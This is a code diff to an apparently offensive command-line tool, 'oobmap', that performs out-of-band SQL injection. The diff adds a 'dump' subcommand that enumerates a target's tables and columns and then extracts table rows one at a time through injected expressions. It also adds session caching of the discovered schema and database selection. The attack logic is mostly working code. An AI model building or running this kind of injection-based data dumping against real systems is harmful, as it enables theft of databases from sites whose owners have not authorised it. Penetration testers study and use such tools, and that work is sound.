@@ -208,8 +208,68 @@ def extract(args) -> int:
     return 0
 
 
+def dump(args) -> int:
+    require_param(args)
+    flush_session_once(args)
+    dbms = DBMS[args.dbms]
+    columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
+    columns = validate_dump_target(args, dbms, columns)
+
+    print(f"[+] dumping table {args.table} columns: {', '.join(columns)}")
+    if args.database:
+        print(f"[+] database/schema: {args.database}")
+    if args.where:
+        print(f"[+] where: {args.where}")
+
+    rows = []
+    for index in range(args.limit):
+        expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
+        print(f"\n[+] row index {index}: {expr}")
+        value = extract_value(args, expr, args.alphabet, args.max_len)
+        if not value:
+            print(f"[+] no more rows at index {index}")
+            break
+        row = split_dump_row(value, len(columns))
+        rows.append(row)
+        print_dump_row(columns, row)
+
+    if rows:
+        print("\n[+] dump result")
+        print_dump_table(columns, rows)
+    return 0
+
+
+def split_dump_row(value: str, column_count: int) -> list[str]:
+    parts = value.split("|")
+    if len(parts) < column_count:
+        parts.extend([""] * (column_count - len(parts)))
+    if len(parts) > column_count:
+        head = parts[: column_count - 1]
+        tail = "|".join(parts[column_count - 1 :])
+        parts = head + [tail]
+    return parts
+
+
+def print_dump_row(columns: list[str], row: list[str]):
+    pairs = [f"{column}={value}" for column, value in zip(columns, row)]
+    print("[+] " + ", ".join(pairs))
+
+
+def print_dump_table(columns: list[str], rows: list[list[str]]):
+    widths = [len(column) for column in columns]
+    for row in rows:
+        widths = [max(width, len(value)) for width, value in zip(widths, row)]
+    header = " | ".join(column.ljust(width) for column, width in zip(columns, widths))
+    sep = "-+-".join("-" * width for width in widths)
+    print(header)
+    print(sep)
+    for row in rows:
+        print(" | ".join(value.ljust(width) for value, width in zip(row, widths)))
+
+
 def enum(args) -> int:
     require_param(args)
+    flush_session_once(args)
     dbms = DBMS[args.dbms]
     selected = []
     for option, key in (
@@ -228,12 +288,18 @@ def enum(args) -> int:
 
     for key in selected:
         if key == "tables":
-            enumerate_rows(args, "table", lambda index: dbms.table_expression(index))
+            values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
+            save_catalog_values(args, "tables", values)
             continue
         if key == "columns":
             if not args.table:
                 raise SystemExit("enum --columns requires -T/--table")
-            enumerate_rows(args, f"column({args.table})", lambda index: dbms.column_expression(args.table, index))
+            values = enumerate_rows(
+                args,
+                f"column({args.table})",
+                lambda index: dbms.column_expression(args.table, index, args.database),
+            )
+            save_catalog_values(args, "columns", values, args.table)
             continue
 
         expr = dbms.metadata_expression(key)
@@ -249,7 +315,8 @@ def enum(args) -> int:
 def enumerate_rows(args, label: str, expression_builder) -> list[str]:
     values = []
     print(f"\n[+] enum {label}s")
-    for index in range(args.limit):
+    limit = getattr(args, "_catalog_limit", args.limit)
+    for index in range(limit):
         try:
             expr = expression_builder(index)
         except ValueError as exc:
@@ -264,6 +331,80 @@ def enumerate_rows(args, label: str, expression_builder) -> list[str]:
         values.append(value)
         print(f"[+] {label}[{index}]: {value}")
     return values
+
+
+def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
+    if not args.validate:
+        if not columns:
+            raise SystemExit("dump without -C/--column requires validation/enumeration; keep --validate enabled or provide -C")
+        return columns
+
+    tables = get_or_enumerate_catalog(args, "tables", lambda index: dbms.table_expression(index, args.database))
+    if args.table not in tables and args.table.upper() not in [table.upper() for table in tables]:
+        raise SystemExit(
+            f"table not confirmed in current session/catalog: {args.table}. "
+            "Try --fresh-queries, adjust -D/--database, or run enum --tables."
+        )
+
+    known_columns = get_or_enumerate_catalog(
+        args,
+        "columns",
+        lambda index: dbms.column_expression(args.table, index, args.database),
+        args.table,
+    )
+    if not columns:
+        if not known_columns:
+            raise SystemExit(f"no columns discovered for table: {args.table}")
+        print(f"[+] auto-selected columns from catalog: {', '.join(known_columns)}")
+        return known_columns
+
+    known_upper = {column.upper() for column in known_columns}
+    missing = [column for column in columns if column.upper() not in known_upper]
+    if missing:
+        raise SystemExit(
+            "column(s) not confirmed in current session/catalog: "
+            + ", ".join(missing)
+            + ". Try --fresh-queries or run enum --columns -T "
+            + args.table
+        )
+    return columns
+
+
+def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | None = None) -> list[str]:
+    request = parse_raw_request(args.request)
+    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
+    try:
+        cached = None if args.fresh_queries else session.get_catalog(args.dbms, args.database, kind, table)
+    finally:
+        session.close()
+    if cached is not None:
+        print(f"[+] using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
+        return cached
+
+    label = "table" if kind == "tables" else f"column({table})"
+    catalog_args = copy.copy(args)
+    catalog_args._catalog_limit = getattr(args, "enum_limit", args.limit)
+    values = enumerate_rows(catalog_args, label, expression_builder)
+    save_catalog_values(args, kind, values, table)
+    return values
+
+
+def save_catalog_values(args, kind: str, values: list[str], table: str | None = None):
+    request = parse_raw_request(args.request)
+    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
+    try:
+        session.save_catalog(args.dbms, args.database, kind, values, table)
+    finally:
+        session.close()
+
+
+def flush_session_once(args):
+    if not args.flush_session:
+        return
+    request = parse_raw_request(args.request)
+    session = SessionStore(args.output_dir, request, args.force_ssl, flush=True)
+    session.close()
+    args.flush_session = False
 
 
 def require_param(args):
@@ -299,6 +440,7 @@ def add_common(parser):
     parser.add_argument("--output-dir", help="session/output directory (default: ~/.local/share/oobmap/output)")
     parser.add_argument("--flush-session", action="store_true", help="delete the target session before running")
     parser.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results but keep the session")
+    parser.add_argument("-D", "--database", help="database/schema/catalog to use for metadata and dump queries")
     parser.add_argument("-v", "--verbose", action="store_true")
 
 
@@ -327,11 +469,15 @@ def make_parser():
     p_dump = sub.add_parser("dump", help="convenience wrapper around extract")
     add_common(p_dump)
     p_dump.add_argument("-T", "--table", required=True)
-    p_dump.add_argument("-C", "--column", required=True)
+    p_dump.add_argument("-C", "--column", help="comma-separated columns; if omitted, oobmap enumerates columns first")
     p_dump.add_argument("--where")
     p_dump.add_argument("--alphabet", default=DEFAULT_ALPHABET)
     p_dump.add_argument("--max-len", type=int, default=40)
-    p_dump.set_defaults(func=extract)
+    p_dump.add_argument("--limit", type=int, default=20, help="maximum rows to dump")
+    p_dump.add_argument("--enum-limit", type=int, default=50, help="maximum tables/columns to enumerate during validation")
+    p_dump.add_argument("--validate", dest="validate", action="store_true", default=True, help="confirm table/columns before dumping (default)")
+    p_dump.add_argument("--no-validate", dest="validate", action="store_false", help="skip catalog validation; requires -C")
+    p_dump.set_defaults(func=dump)
 
     p_enum = sub.add_parser("enum", help="extract common DBMS metadata over OOB")
     add_common(p_enum)
